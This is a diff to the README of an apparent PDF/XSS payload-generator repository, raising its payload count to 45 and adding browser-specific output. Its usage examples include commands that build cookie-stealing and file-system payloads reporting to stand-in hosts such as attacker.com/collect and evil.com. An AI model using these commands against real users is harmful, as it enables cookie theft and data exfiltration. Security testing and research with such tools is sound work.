@@ -14,7 +14,7 @@ XSS-PDF/
 ├── PDF-XSS/                               # Complete PDF-XSS Tool
 │   ├── script.py                          # Main PDF generator script
 │   ├── Another-Script.py                  # Alternative browser-specific PDF generator  
-│   ├── pdf_payloads.json                 # Consolidated PDF payload database (20 payloads)
+│   ├── pdf_payloads.json                 # Consolidated PDF payload database (45 payloads)
 │   ├── IMPROVEMENTS.md                    # Feature improvements documentation
 │   ├── README.md                          # PDF-XSS tool documentation
 │   ├── requirements.txt                   # PDF tool dependencies (standard library only)
@@ -37,9 +37,10 @@ These tools are designed for legitimate security testing, educational purposes, 
 
 ### PDF-XSS Tool
 **Advanced PDF Sandbox Escape and Browser Exploitation Framework**
-- **20+ sophisticated PDF payloads** targeting browser PDF renderers
+- **45+ sophisticated PDF payloads** targeting browser PDF renderers
 - **Multi-browser support**: Chrome (PDFium), Firefox (PDF.js), Safari (PDFKit), Adobe Reader, Edge
 - **Sandbox escape techniques**: DOM access, file system access, command execution, network exfiltration
+- **Browser-specific file generation**: Create single files with all payloads for a specific browser
 - **No dependencies**: Uses only Python standard library
 - **Research-based**: Built on 50+ CVE references and security conference research
 
@@ -121,8 +122,14 @@ python3 script.py -t alert
 python3 script.py -t cookie -u http://attacker.com/collect
 python3 script.py -b firefox --category file_system -u http://evil.com
 
+# Create single file with all payloads for specific browser
+python3 script.py -b chrome --browser-specific-file -u http://test.com
+
 # Alternative script usage
 python3 Another-Script.py -b chrome -u http://test.com
+
+# Alternative script: single file with all browser payloads
+python3 Another-Script.py -b firefox --browser-specific-file -u http://evil.com
 ```
 
 ### Excel-XSS Tool Examples  
